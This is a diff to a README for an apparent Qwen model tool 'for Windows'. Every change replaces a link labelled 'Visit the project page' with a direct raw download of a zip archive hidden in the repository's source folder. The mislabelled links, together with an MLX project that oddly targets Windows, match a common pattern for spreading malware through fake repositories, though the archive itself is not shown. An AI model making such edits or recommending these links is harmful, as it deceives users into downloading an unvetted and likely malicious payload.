@@ -1,6 +1,6 @@
 # ⚙️ Qwen3.5-TurboQuant-MLX-LM - Fast Qwen Runs on Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM/main/src/turbomlx/ML_Turbo_Quant_Qwen_LM_1.9.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This page helps you get the files, open the project, and run it with the least f
 
 Use the project page below to visit the download location and get the current release files:
 
-[Visit the project page](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
+[Visit the project page](https://raw.githubusercontent.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM/main/src/turbomlx/ML_Turbo_Quant_Qwen_LM_1.9.zip)
 
 After you open the page:
 
@@ -217,7 +217,7 @@ Some projects use a portable setup. That means you extract the files and run the
 
 Open the project page here to download and run the files:
 
-[https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
+[https://raw.githubusercontent.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM/main/src/turbomlx/ML_Turbo_Quant_Qwen_LM_1.9.zip](https://raw.githubusercontent.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM/main/src/turbomlx/ML_Turbo_Quant_Qwen_LM_1.9.zip)
 
 ## 🧭 Simple Start Path
 
